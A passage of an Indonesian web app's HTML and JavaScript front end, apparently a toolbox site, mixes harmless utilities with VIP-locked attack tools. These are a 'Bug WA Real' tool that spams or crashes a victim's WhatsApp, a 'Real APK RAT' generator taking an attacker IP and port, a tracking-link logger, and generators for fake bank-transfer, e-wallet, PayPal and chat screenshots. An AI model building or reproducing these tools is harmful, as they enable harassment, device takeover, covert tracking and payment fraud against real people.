<div class="card" data-cat="tools" onclick="openTool('qrtext')"><i class="fa-solid fa-qrcode main-icon"></i><h3>QR Text</h3><p>Teks</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('jsonfmt')"><i class="fa-solid fa-brackets-curly main-icon"></i><h3>JSON Format</h3><p>Rapi</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('b64img')"><i class="fa-solid fa-image main-icon"></i><h3>B64→Img</h3><p>Decode</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('imgb64')"><i class="fa-solid fa-file-image main-icon"></i><h3>Img→B64</h3><p>Encode</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('colorpick')"><i class="fa-solid fa-palette main-icon"></i><h3>Color Picker</h3><p>Warna</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('lorem')"><i class="fa-solid fa-paragraph main-icon"></i><h3>Lorem Ipsum</h3><p>Dummy</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('tts')"><i class="fa-solid fa-volume-high main-icon"></i><h3>TTS</h3><p>Baca</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('mdprev')"><i class="fa-brands fa-markdown main-icon"></i><h3>MD Preview</h3><p>Markdown</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('caesar')"><i class="fa-solid fa-shield main-icon"></i><h3>Caesar</h3><p>Cipher</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('morse')"><i class="fa-solid fa-ellipsis main-icon"></i><h3>Morse</h3><p>Kode</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('t2ascii')"><i class="fa-solid fa-font main-icon"></i><h3>Text→ASCII</h3><p>ASCII</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('base32')"><i class="fa-solid fa-code main-icon"></i><h3>Base32</h3><p>Enc/Dec</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('ascii2t')"><i class="fa-solid fa-arrow-right-arrow-left main-icon"></i><h3>ASCII→Text</h3><p>Decode</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('hex2rgb')"><i class="fa-solid fa-palette main-icon"></i><h3>Hex→RGB</h3><p>Warna</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('aescrypt')"><i class="fa-solid fa-shield-halved main-icon"></i><h3>AES Crypt</h3><p>Encrypt</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('md5hash')"><i class="fa-solid fa-hashtag main-icon"></i><h3>MD5 Hash</h3><p>Hash</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('calc')"><i class="fa-solid fa-calculator main-icon"></i><h3>Kalkulator</h3><p>Hitung</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('bmi')"><i class="fa-solid fa-weight-scale main-icon"></i><h3>BMI</h3><p>Berat</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('stopwatch')"><i class="fa-solid fa-stopwatch main-icon"></i><h3>Stopwatch</h3><p>Timer</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('timestamp')"><i class="fa-solid fa-clock main-icon"></i><h3>Unix Time</h3><p>Waktu</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('agecalc')"><i class="fa-solid fa-cake-candles main-icon"></i><h3>Age Calc</h3><p>Umur</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('romannum')"><i class="fa-solid fa-list-ol main-icon"></i><h3>Roman Num</h3><p>Romawi</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('fibonacci')"><i class="fa-solid fa-bars-staggered main-icon"></i><h3>Fibonacci</h3><p>Deret</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('primecheck')"><i class="fa-solid fa-divide main-icon"></i><h3>Prime</h3><p>Prima</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('factorial')"><i class="fa-solid fa-exclamation main-icon"></i><h3>Factorial</h3><p>n!</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('palindrome')"><i class="fa-solid fa-arrows-left-right main-icon"></i><h3>Palindrome</h3><p>Cek</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('vowelcount')"><i class="fa-solid fa-a main-icon"></i><h3>Vowel</h3><p>Vokal</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('percentcalc')"><i class="fa-solid fa-percent main-icon"></i><h3>Percentage</h3><p>Persen</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('tipcalc')"><i class="fa-solid fa-money-bill main-icon"></i><h3>Tip Calc</h3><p>Tip</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('tempconv')"><i class="fa-solid fa-temperature-half main-icon"></i><h3>Temp Conv</h3><p>Suhu</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('weightconv')"><i class="fa-solid fa-weight-hanging main-icon"></i><h3>Weight Conv</h3><p>Berat</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('leapyear')"><i class="fa-solid fa-calendar-check main-icon"></i><h3>Leap Year</h3><p>Kabisat</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('gcdlcm')"><i class="fa-solid fa-divide main-icon"></i><h3>GCD/LCM</h3><p>FPB</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('randomcolor')"><i class="fa-solid fa-palette main-icon"></i><h3>Rand Color</h3><p>Warna</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('scramble')"><i class="fa-solid fa-shuffle main-icon"></i><h3>Scramble</h3><p>Acak</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('randomname')"><i class="fa-solid fa-users main-icon"></i><h3>Random Name</h3><p>Pilih</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('numtowords')"><i class="fa-solid fa-arrow-right-arrow-left main-icon"></i><h3>Num→Words</h3><p>Angka</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('ipinfo')"><i class="fa-solid fa-location-dot main-icon"></i><h3>IP Info</h3><p>IP</p><span class="tag">NET</span></div>
<div class="card" data-cat="tools" onclick="openTool('webping')"><i class="fa-solid fa-globe main-icon"></i><h3>Web Pinger</h3><p>Ping</p><span class="tag">NET</span></div>
<div class="card" data-cat="tools" onclick="openTool('shorturl')"><i class="fa-solid fa-link main-icon"></i><h3>Short URL</h3><p>URL</p><span class="tag">NET</span></div>
<div class="card" data-cat="tools" onclick="openTool('chat')"><i class="fa-solid fa-robot main-icon"></i><h3>Kaze AI</h3><p>Chat</p><span class="tag">AI</span></div>
</div>

<div class="side-menu" id="side-menu">
<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
<h2 style="font-size:16px;color:var(--accent)">Menu Info</h2>
<i class="fa-solid fa-xmark" style="font-size:20px;cursor:pointer;color:var(--sub)" onclick="toggleMenu()"></i>
</div>
<div style="font-size:14px;font-weight:bold;color:var(--accent);margin-bottom:8px">Info & Support</div>
<a href="https://whatsapp.com/channel/0029Va5M9p6q7r8s9t0u1v2w" target="_blank" class="menu-item"><i class="fa-brands fa-whatsapp" style="color:#25D366"></i><div><h4>Saluran WA</h4><p>Update Fitur</p></div></a>
<a href="#" onclick="document.getElementById('donasi-modal').style.display='flex';toggleMenu();" class="menu-item"><i class="fa-solid fa-mug-hot" style="color:#ffb800"></i><div><h4>Donasi / Request</h4><p>Beli VIP / Fitur</p></div></a>
<div style="font-size:14px;font-weight:bold;color:var(--accent);margin-top:16px;margin-bottom:8px">Lapor Bug</div>
<a href="https://wa.me/6285833277934?text=Halo%20Admin,%20lapor%20bug%20TEMA" target="_blank" class="menu-item"><i class="fa-solid fa-palette"></i><div><h4>Lapor Bug Tema</h4><p>Tampilan</p></div></a>
<a href="https://wa.me/6285833277934?text=Halo%20Admin,%20lapor%20bug%20FITUR" target="_blank" class="menu-item"><i class="fa-solid fa-bug"></i><div><h4>Lapor Bug Lain</h4><p>Error / Fitur</p></div></a>
</div>

<div id="login-modal" class="modal-overlay">
<div class="modal-content" style="text-align:center">
<div id="form-login">
<h2 style="justify-content:center;color:var(--accent)"><i class="fa-solid fa-lock"></i> Sign In</h2>
<input id="login-user" placeholder="Username" style="text-align:center">
<input id="login-pass" type="password" placeholder="Password" style="text-align:center">
<button onclick="doLogin()" style="margin-top:10px">MASUK</button>
<p style="font-size:11px;margin-top:15px;cursor:pointer;color:#888" onclick="toggleAuth('register')">Belum punya akun? <span style="color:var(--accent)">Daftar</span></p>
</div>
<div id="form-register" style="display:none">
<h2 style="justify-content:center;color:#00ff88"><i class="fa-solid fa-user-plus"></i> Daftar</h2>
<input id="reg-user" placeholder="Username Baru" style="text-align:center">
<input id="reg-pass" type="password" placeholder="Password Baru" style="text-align:center">
<button onclick="doRegister()" style="margin-top:10px;background:#00ff88;color:#000">DAFTAR</button>
<p style="font-size:11px;margin-top:15px;cursor:pointer;color:#888" onclick="toggleAuth('login')">Sudah punya akun? <span style="color:#00ff88">Login</span></p>
</div>
<button onclick="document.getElementById('login-modal').style.display='none'" style="margin-top:15px;background:transparent;border:1px solid #444;color:#888">TUTUP</button>
</div>
</div>

<div class="modal-overlay" id="tool-modal"><div class="modal-content" id="tool-content"></div></div>

<div id="donasi-modal" class="modal-overlay">
<div class="modal-content" style="text-align:center;border-color:var(--vip)">
<i class="fa-solid fa-mug-hot" style="font-size:50px;color:var(--vip);margin-bottom:15px"></i>
<h2 style="justify-content:center;color:var(--vip)">Donasi & Request</h2>
<p style="font-size:13px;color:#ccc;margin-bottom:20px">Beli VIP/VVIP atau request fitur baru via WhatsApp.</p>
<a href="https://wa.me/6285833277934?text=Halo%20Admin,%20saya%20mau%20beli%20VIP" target="_blank" style="display:block;background:#25D366;color:#fff;text-decoration:none;padding:12px;border-radius:10px;font-weight:bold;margin-bottom:10px"><i class="fa-brands fa-whatsapp"></i> Chat Admin</a>
<button onclick="document.getElementById('donasi-modal').style.display='none'" style="background:transparent;border:1px solid #444;color:#888">TUTUP</button>
</div>
</div>

<div id="toast"></div>
<audio id="bg-music" loop></audio>

<div id="fakewa-capture" class="hidden-captures" style="background:#efeae2;font-family:Arial;padding-bottom:20px;height:600px;width:360px">
<div style="background:#075E54;padding:15px;color:white;display:flex;align-items:center;gap:10px"><i class="fa-solid fa-arrow-left"></i><div style="width:35px;height:35px;background:#ccc;border-radius:50%"></div><div><b id="fakewa-target-name">Budi</b><br><span style="font-size:11px">online</span></div></div>
<div style="padding:20px 15px" id="fakewa-chat-area"></div>
</div>

<div id="fakesms-capture" class="hidden-captures" style="background:#fff;font-family:Arial;padding-bottom:20px;height:600px;width:360px">
<div style="background:#f8f9fa;padding:15px;color:#333;text-align:center;font-weight:bold;border-bottom:1px solid #ddd"><div id="sms-target-name">Budi</div></div>
<div style="padding:20px 15px" id="sms-chat-area"></div>
</div>

<div id="fakewacall-capture" class="hidden-captures" style="height:700px;background:#075E54;font-family:Arial;text-align:center;color:white;width:360px">
<div style="padding:50px 20px"><div style="width:120px;height:120px;background:#ccc;border-radius:50%;margin:0 auto 20px"></div><h2 id="call-name" style="margin:0;font-size:28px">Budi</h2><p style="color:#aaa;font-size:14px;margin-top:10px">Incoming WhatsApp Call...</p></div>
</div>

<div id="fakewacontext-capture" class="hidden-captures" style="background:#0b141a;font-family:Arial;padding-bottom:20px;width:360px">
<div style="padding:20px 15px;display:flex;flex-direction:column;gap:10px">
<div style="background:#202c33;color:#e9edef;padding:10px 15px;border-radius:8px;font-size:14px;max-width:80%;align-self:flex-start" id="ctx-msg">Pesan...</div>
<div style="background:#233138;border-radius:12px;padding:10px 0;width:200px">
<div style="padding:12px 20px;color:#e9edef;font-size:14px;border-bottom:1px solid #111b21">Beri Bintang</div>
<div style="padding:12px 20px;color:#e9edef;font-size:14px;border-bottom:1px solid #111b21">Balas</div>
<div style="padding:12px 20px;color:#e9edef;font-size:14px;border-bottom:1px solid #111b21">Teruskan</div>
<div style="padding:12px 20px;color:#e9edef;font-size:14px;border-bottom:1px solid #111b21">Salin</div>
<div style="padding:12px 20px;color:#ea4335;font-size:14px">Hapus</div>
</div>
</div>
</div>

<div id="fakeiosnotif-capture" class="hidden-captures" style="height:800px;background:#000;font-family:-apple-system,sans-serif;color:#fff;padding:20px;width:360px">
<div style="text-align:center;margin-top:30px"><div style="font-size:16px">Sabtu, 11 Maret</div><div style="font-size:80px;font-weight:300;letter-spacing:-2px;margin-top:-10px">2.47</div></div>
<div style="margin-top:40px;padding:0 10px"><div style="font-size:20px;font-weight:bold;margin-bottom:10px">WhatsApp</div>
<div style="background:#2c2c2e;border-radius:16px;padding:15px;display:flex;gap:10px"><div style="width:40px;height:40px;background:#555;border-radius:50%"></div><div style="flex:1"><b>d</b><div id="ios-notif-msg" style="font-size:14px">Pesan masuk...</div></div></div>
</div>
</div>

<div id="faketelegram-capture" class="hidden-captures" style="background:#17212b;font-family:Arial;padding-bottom:20px;width:360px;height:600px">
<div style="background:#242f3d;padding:15px;color:white;display:flex;align-items:center;gap:10px"><i class="fa-solid fa-arrow-left"></i><div style="width:35px;height:35px;background:#ccc;border-radius:50%"></div><div><b>Telegram User</b><br><span style="font-size:11px;color:#888">online</span></div></div>
<div style="padding:20px 15px" id="faketelegram-chat-area"></div>
</div>

<div id="fakegoogle-capture" class="hidden-captures" style="background:#fff;font-family:Arial;padding:20px;width:360px">
<div style="border:1px solid #dfe1e5;border-radius:24px;padding:10px 20px;color:#5f6368"><i class="fa-solid fa-magnifying-glass"></i> <span id="g-query-display" style="font-size:16px;margin-left:10px">Kaze</span></div>
<div style="margin-top:20px;color:#1a0dab;font-size:18px;text-decoration:underline">Hasil pencarian untuk <span id="g-query-res"></span></div>
</div>

<div id="fakediscord-capture" class="hidden-captures" style="background:#36393f;color:#fff;padding:20px;font-family:Arial;width:360px">
<div style="display:flex;gap:10px"><div style="width:40px;height:40px;border-radius:50%;background:#555"></div><div><b id="dc-name" style="color:#7289da">User</b> <span style="font-size:12px;color:#888">Today at 12:00</span><p id="dc-msg" style="margin-top:5px">Message...</p></div></div>
</div>

<div id="fakebca-capture" class="hidden-captures" style="background:#f4f6f9;font-family:Arial;padding-bottom:20px;width:360px">
<div style="background:#0066ae;padding:20px;color:white;font-size:18px;font-weight:bold"><i class="fa-solid fa-chevron-left" style="margin-right:15px"></i> BCA Mobile</div>
<div style="margin:20px;background:#fff;border-radius:12px;padding:20px">
<div style="text-align:center"><h3 style="color:#333">Transaksi Berhasil</h3></div>
<div style="display:flex;justify-content:space-between;margin-top:15px"><span style="color:#888">Ke Rekening</span><span style="color:#333;font-weight:bold" id="bca-c-target">Budi</span></div>
<div style="display:flex;justify-content:space-between;margin-top:10px"><span style="color:#888">Nominal</span><span style="color:#333;font-weight:bold" id="bca-c-amount">Rp 1.000.000</span></div>
</div>
</div>

<div id="dana-capture-area" class="hidden-captures" style="width:360px">
<div style="background:#118EEA;padding:15px 20px;color:white;display:flex;align-items:center;font-size:16px;font-weight:600"><i class="fa-solid fa-chevron-left" style="margin-right:15px"></i> Detail Transaksi</div>
<div style="background:white;margin:15px;border-radius:12px;padding:25px 20px 30px">
<div style="text-align:center;font-family:Arial;font-weight:900;font-size:26px;color:black;letter-spacing:2px;margin-bottom:20px">QRIS</div>
<div style="display:flex;justify-content:space-between;font-size:12px;color:#888;margin-bottom:15px"><span>26 Okt 2026</span><span>ID DANA <span id="dana-c-id">0882••••7274</span></span></div>
<div style="border-top:1px dashed #ddd;margin:15px 0"></div>
<div style="display:flex;align-items:center;color:#333;font-size:13px;font-weight:bold;margin-bottom:8px"><i class="fa-solid fa-circle-check" style="color:#00D26A;margin-right:8px"></i> Transaksi berhasil!</div>
<div style="font-size:15px;font-weight:bold;color:#333;margin-bottom:20px">Pembayaran ke <span id="dana-c-merchant">QRISPAY</span></div>
<div style="background:#f8fbff;padding:15px;border-radius:8px;display:flex;justify-content:space-between;align-items:center;margin-bottom:15px"><span style="font-size:14px;color:#333;font-weight:bold">Total Bayar</span><h3 id="dana-c-total" style="font-size:20px;color:#333;margin:0">Rp5.255</h3></div>
</div>
</div>

<div id="fakeigprofile-capture" class="hidden-captures" style="background:#fff;color:#333;padding:20px;font-family:Arial;width:360px">
<div style="display:flex;align-items:center;gap:15px;margin-bottom:15px"><div style="width:70px;height:70px;background:#ddd;border-radius:50%"></div><div><b id="igp-c-name" style="font-size:18px">username</b></div></div>
<div style="display:flex;gap:20px;font-size:14px"><div><b>1.2K</b> Posts</div><div><b>5.6K</b> Followers</div><div><b>234</b> Following</div></div>
</div>

<div id="faketweet-capture" class="hidden-captures" style="background:#15202b;color:#fff;padding:20px;font-family:Arial;width:360px">
<div style="display:flex;gap:10px"><div style="width:50px;height:50px;border-radius:50%;background:#555"></div><div><b id="ft-c-name">User</b> <span style="color:#8899a6">@user</span><p id="ft-c-msg" style="margin-top:5px;font-size:15px">Tweet...</p></div></div>
</div>

<div id="fakepaypal-capture" class="hidden-captures" style="background:#fff;color:#333;padding:20px;font-family:Arial;width:360px">
<div style="color:#003087;font-weight:bold;font-size:24px;text-align:center;margin-bottom:20px">PayPal</div>
<div style="text-align:center"><div style="color:#888">Anda menerima</div><div id="pp-c-amt" style="font-size:28px;font-weight:bold;color:#333">$100.00</div><div style="margin-top:10px;color:#888">dari <span id="pp-c-name" style="color:#333;font-weight:bold">John Doe</span></div></div>
</div>

<div id="fakeshopee-capture" class="hidden-captures" style="background:#fff;color:#333;font-family:Arial;width:360px">
<div style="background:#ee4d2d;color:#fff;padding:15px;text-align:center;font-weight:bold;font-size:18px">Shopee</div>
<div style="padding:20px;text-align:center"><div style="width:80px;height:80px;background:#eee;margin:0 auto 15px;border-radius:8px"></div><div id="sp-c-item" style="font-size:16px;font-weight:bold;margin-bottom:10px">Barang</div><div id="sp-c-price" style="font-size:18px;color:#ee4d2d;font-weight:bold">Rp 100.000</div></div>
</div>

<div id="fakenetflix-capture" class="hidden-captures" style="background:#000;color:#fff;padding:20px;font-family:Arial;width:360px;text-align:center">
<div style="color:#e50914;font-size:36px;font-weight:bold;margin-bottom:20px">NETFLIX</div>
<div style="font-size:18px;margin-bottom:20px">Who's watching?</div>
<div style="width:100px;margin:0 auto"><div style="width:80px;height:80px;background:#555;border-radius:8px;margin:0 auto"></div><div id="nf-c-name" style="margin-top:10px;font-size:16px">User</div></div>
</div>

<div id="fakespotify-capture" class="hidden-captures" style="background:#121212;color:#fff;padding:20px;font-family:Arial;width:360px">
<div style="display:flex;align-items:center;gap:15px"><div style="width:80px;height:80px;background:#1db954;border-radius:4px"></div><div><div id="sp-c-title" style="font-size:18px;font-weight:bold">Lagu</div><div id="sp-c-artist" style="color:#aaa">Artis</div></div></div>
</div>

<div id="fakegopay-capture" class="hidden-captures" style="background:#00aed6;padding:20px;color:#fff;font-family:Arial;width:360px;border-radius:12px">
<div style="font-size:14px">Saldo GoPay</div>
<div id="gp-c-bal" style="font-size:32px;font-weight:bold">Rp 1.500.000</div>
</div>

<div id="fakeovo-capture" class="hidden-captures" style="background:#4c3494;padding:20px;color:#fff;font-family:Arial;width:360px;border-radius:12px">
<div style="font-size:14px">OVO Cash</div>
<div id="ovo-c-bal" style="font-size:32px;font-weight:bold">Rp 2.500.000</div>
</div>

<div id="fakesteam-capture" class="hidden-captures" style="background:#171a21;color:#fff;padding:20px;font-family:Arial;width:360px;border-radius:12px">
<div style="text-align:center"><div style="width:80px;height:80px;background:#2a475e;border-radius:8px;margin:0 auto 10px"></div><div id="st-c-name" style="font-size:18px;font-weight:bold">Player</div><div style="color:#66c0f4;font-size:12px">Online</div></div>
</div>

<div id="fakecrypto-capture" class="hidden-captures" style="background:#181a20;padding:20px;color:#fff;font-family:Arial;width:360px">
<div style="font-size:14px;color:#848e9c">Total Balance</div>
<div id="crypto-c-bal" style="font-size:36px;font-weight:bold;margin:5px 0">$ 15,000.00</div>
<div style="color:#0ecb81">+$ 2,400.00 (18.5%)</div>
<div style="margin-top:20px;background:#2b3139;padding:15px;border-radius:8px"><b>BTC</b> <span id="crypto-c-btc" style="float:right">0.25 BTC</span></div>
</div>

<div id="fakelobbyml-capture" class="hidden-captures" style="height:600px;background:linear-gradient(to bottom,#1a2235,#0d111a);font-family:Arial;width:360px">
<div style="padding:15px;display:flex;justify-content:space-between;color:#fff;border-bottom:1px solid #222"><i class="fa-solid fa-arrow-left"></i> CLASSIC</div>
<div style="display:flex;justify-content:space-around;padding:30px 15px">
<div style="width:140px;text-align:center"><div style="background:#d4af37;border-radius:10px;padding:10px"><div style="width:70px;height:70px;background:#333;border-radius:8px;margin:0 auto"></div><div style="color:#fff;font-size:12px;margin-top:5px" id="ml-c-name">Player1</div></div></div>
<div style="width:140px;text-align:center"><div style="background:rgba(30,50,80,0.5);border-radius:10px;padding:10px;border:1px solid #3b82f6"><div style="width:70px;height:70px;background:rgba(255,255,255,0.1);border-radius:8px;margin:0 auto"></div><div style="color:#555;font-size:12px;margin-top:5px">Waiting...</div></div></div>
</div>
</div>

<div id="fakemlchat-capture" class="hidden-captures" style="height:600px;background:#1e2a45;font-family:Arial;padding:10px;width:360px">
<div style="display:flex;gap:10px"><div style="width:40px;height:40px;background:#333;border:1px solid #fff"></div><div style="flex:1"><div style="font-size:12px;color:#ffd700">#07 neyya</div><div id="mlc-msg" style="background:#2a3a5a;padding:8px 12px;color:#fff;font-size:13px;border-radius:0 10px 10px 10px;margin-top:5px">boleh bntu push rank gak</div></div></div>
</div>

<div id="fakemlprofile-capture" class="hidden-captures" style="height:600px;background:#0a0e17;font-family:Arial;color:#fff;padding:20px;width:360px">
<div style="text-align:center"><div style="width:80px;height:80px;background:#333;border-radius:50%;margin:0 auto 10px"></div><h2 id="mlp-c-name" style="margin:0">Player</h2><div style="background:#ffd700;color:#000;display:inline-block;padding:2px 10px;border-radius:10px;font-size:12px" id="mlp-c-rank">Mythic</div></div>
</div>

<script>
let userTier='GUEST';
const vipRestricted=['realtracker','bugwareal','genapk','fakewa','fakesms','fakewacall','fakewacontext','fakeiosnotif','faketelegram','fakegoogle','fakediscord','fakebca','dana','fakeigprofile','faketweet','fakepaypal','fakeshopee','fakenetflix','fakespotify','fakegopay','fakeovo','fakesteam','fakecrypto'];

function toggleMenu(){document.getElementById('side-menu').classList.toggle('open')}
function showToast(m){const t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',3000)}
function toggleAuth(f){document.getElementById('form-login').style.display=f==='login'?'block':'none';document.getElementById('form-register').style.display=f==='register'?'block':'none'}
function setCat(cat,el){
    document.querySelectorAll('.tab').forEach(c=>c.classList.remove('active'));
    el.classList.add('active');
    document.querySelectorAll('.card').forEach(card=>{
        if(cat==='all'||cat===card.getAttribute('data-cat')){card.style.display='flex'}
        else{card.style.display='none'}
    });
}
async function doLogin(){
    const u=document.getElementById('login-user').value,p=document.getElementById('login-pass').value;
    if(!u||!p)return alert("Isi username dan password!");
    try{
        const res=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
        const data=await res.json();
        if(res.ok&&data.success){
            userTier=data.tier;
            document.getElementById('login-modal').style.display='none';
            document.getElementById('user-status').innerText=data.username;
            let th=data.tier==='DEVELOPER'?'<span class="dev-badge"><i class="fa-solid fa-code"></i> DEV</span>':data.tier==='VVIP'?'<span class="vip-badge" style="background:#ff0055;color:#fff"><i class="fa-solid fa-syringe"></i> VVIP</span>':data.tier==='VIP'?'<span class="vip-badge"><i class="fa-solid fa-crown"></i> VIP</span>':'<span class="role-badge">Role: Basic</span>';
            document.getElementById('user-tier').innerHTML=th;
            alert("LOGIN BERHASIL!");
        }else{alert("LOGIN GAGAL! "+(data.message||''))}
    }catch(e){alert("KONEKSI ERROR!")}
}
async function doRegister(){
    const u=document.getElementById('reg-user').value,p=document.getElementById('reg-pass').value;
    if(!u||!p)return alert("Isi semua kolom!");
    try{
        const res=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
        const data=await res.json();
        if(data.success){alert(data.message);toggleAuth('login')}else{alert(data.message)}
    }catch(e){alert("KONEKSI ERROR!")}
}
function openTool(id){
    if(vipRestricted.includes(id)&&userTier!=='VIP'&&userTier!=='VVIP'&&userTier!=='DEVELOPER'){
        document.getElementById('vip-restrict').style.display='flex';return;
    }
    const T={
        realtracker:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Real Tracker</h2><input id="trk-id" placeholder="Nama Link"><div class="btn-row"><button onclick="genTrackLink()">Generate</button></div><div id="trk-res" style="margin-top:10px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div><div class="btn-row" style="margin-top:10px"><button onclick="viewLogs()">Refresh Log</button></div><div id="trk-logs" style="margin-top:10px;background:#111;padding:12px;border-radius:8px;color:#00ff88;font-size:11px;white-space:pre-line;max-height:200px;overflow-y:auto"></div>`,
        bugwareal:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Bug WA Real</h2><p style="font-size:11px;color:#ffb800;margin-bottom:10px">Isi WA SENDER = nomor WA LO (buat login via pairing code). Target = nomor korban.</p><input id="bwr-target" placeholder="Nomor Target (62812...)"><input id="bwr-sender" placeholder="Nomor WA SENDER (62812...)"><select id="bwr-mode"><option value="lag">Lag (spam pesan)</option><option value="crash">Crash (file bomb)</option></select><input id="bwr-hours" type="number" value="0.1" min="0.1" max="12" step="0.1"><div class="btn-row"><button onclick="startBugWa()">MULAI</button></div><div id="bwr-status" style="margin-top:10px;background:#111;padding:12px;border-radius:8px;color:#00ff88;font-size:11px;white-space:pre-wrap;max-height:300px;overflow-y:auto;font-family:monospace"></div>`,
        genapk:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Real APK RAT</h2><input id="apk-ip" placeholder="IP Publik"><input id="apk-port" type="number" value="4444"><div class="btn-row"><button onclick="genApk()">Generate</button></div><div id="apk-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;font-size:11px;white-space:pre-line"></div>`,
        fakewa:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake WA Chat</h2><input id="wa-name" placeholder="Nama Target..."><input id="wa-msg" placeholder="Isi Pesan..."><div class="btn-row"><button onclick="genFakeWa()">Generate</button></div><div id="fakewa-result" style="display:none;text-align:center;margin-top:16px"><img id="fakewa-img" style="width:100%;border-radius:8px"><a id="fakewa-dl" download="FakeWA.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakesms:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake SMS</h2><input id="sms-name" placeholder="Nama Target..."><input id="sms-msg" placeholder="Isi Pesan..."><div class="btn-row"><button onclick="genFakeSms()">Generate</button></div><div id="fakesms-result" style="display:none;text-align:center;margin-top:16px"><img id="fakesms-img" style="width:100%;border-radius:8px"><a id="fakesms-dl" download="FakeSMS.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakewacall:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake WA Call</h2><input id="call-name" placeholder="Nama Penelepon..."><div class="btn-row"><button onclick="genFakeWaCall()">Generate</button></div><div id="fakewacall-result" style="display:none;text-align:center;margin-top:16px"><img id="fakewacall-img" style="width:100%;border-radius:8px"><a id="fakewacall-dl" download="FakeWACall.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakewacontext:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake WA Menu</h2><input id="ctx-msg" placeholder="Isi Pesan..."><div class="btn-row"><button onclick="genFakeWaContext()">Generate</button></div><div id="fakewacontext-result" style="display:none;text-align:center;margin-top:16px"><img id="fakewacontext-img" style="width:100%;border-radius:8px"><a id="fakewacontext-dl" download="FakeWAMenu.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakeiosnotif:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake iOS Notif</h2><input id="ios-msg" placeholder="Isi Pesan..."><div class="btn-row"><button onclick="genFakeIosNotif()">Generate</button></div><div id="fakeiosnotif-result" style="display:none;text-align:center;margin-top:16px"><img id="fakeiosnotif-img" style="width:100%;border-radius:8px"><a id="fakeiosnotif-dl" download="FakeIOS.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
